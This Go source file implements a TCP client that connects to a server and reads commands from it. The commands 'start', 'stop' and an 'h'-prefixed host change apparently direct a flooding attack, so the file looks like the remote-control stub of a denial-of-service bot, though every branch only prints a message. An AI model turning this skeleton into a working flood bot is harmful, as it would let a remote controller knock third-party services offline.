package socket

import (
	"bufio"
	"fmt"
	"net"
	"strings"
)

func ConnectToServer(address string) (net.Conn, error) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %v", err)
	}
	fmt.Println("Connected to server:", address)
	return conn, nil
}

func ReadFromServer(conn net.Conn) {
	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from server:", err)
			return
		}
		fmt.Print("Received from server: ", message)

		trimmedMsg := strings.TrimSpace(message)
		if trimmedMsg == "start" {
			fmt.Println("start flood")
		} else if trimmedMsg == "stop" {
			fmt.Println("stop flood")
		} else if strings.HasPrefix(trimmedMsg, "h") {
			fmt.Println("changing host")
		}

	}
}
